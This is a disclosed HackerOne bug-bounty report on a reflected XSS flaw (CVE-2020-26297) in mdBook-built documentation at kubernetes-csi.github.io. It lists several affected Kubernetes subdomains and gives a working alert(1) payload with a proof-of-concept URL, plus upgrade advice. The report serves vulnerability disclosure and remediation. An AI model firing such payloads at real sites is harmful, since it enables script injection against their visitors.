---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1073514'
original_report_id: '1073514'
title: XSS on kubernetes-csi.github.io (mdBook)
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: kubernetes
created_at: '2021-01-07T14:52:00.522Z'
disclosed_at: '2021-02-04T18:59:05.841Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 8
asset_identifier: kubernetes-csi.github.io
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# XSS on kubernetes-csi.github.io (mdBook)

## Metadata

- HackerOne Report ID: 1073514
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: kubernetes
- Disclosed At: 2021-02-04T18:59:05.841Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

Report Submission Form

## Summary:
Hi,

I have recently found XSS vulnerability in mdBook (CVE-2020-26297), fixed and disclosed on 4th January 2020. 
The details were published in a security advisory here: https://blog.rust-lang.org/2021/01/04/mdbook-security-advisory.html

I did a quick recon and found a couple of vulnerable endpoints:
* https://capz.sigs.k8s.io
* https://cluster-api-aws.sigs.k8s.io
* https://cluster-api.sigs.k8s.io
* https://image-builder.sigs.k8s.io
* https://kubernetes-csi.github.io
* https://master.cluster-api.sigs.k8s.io
* https://release-0-2.cluster-api.sigs.k8s.io
* https://secrets-store-csi-driver.sigs.k8s.io

... where the **https://kubernetes-csi.github.io/docs/** is in scope. Update to the latest version and 

I understand if this is not eligible for a bounty, as you didn't have enough time to fix this. On the other hand, I decided to report it anyway, in case you missed it. And because I wasn't able to find any info grading *grace period* for 0days or new CVEs in your policy. 

Kind regards,

Kamil Vavra
@vavkamil

## Steps To Reproduce:
a) Payload used: `x"->xss<img/src/onerror%3Dalert(1)>`
b) PoC: `https://kubernetes-csi.github.io/docs/?search=x"->xss<img/src/onerror%3Dalert(1)>`
  1. Visit [https://kubernetes-csi.github.io/docs/?search=x%22%2D%3Exss%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E](https://kubernetes-csi.github.io/docs/?search=x%22%2D%3Exss%3Cimg%2Fsrc%2Fonerror%3Dalert%281%29%3E)
  2. You should see the XSS executed

## Mitigations:
Owners of websites built with mdBook have to upgrade to mdBook 0.4.5 or greater and rebuild their website contents with it.

## Supporting Material/References:
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-26297

## Impact

I guess the impact here is minimal, so I submitted it with low severity.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
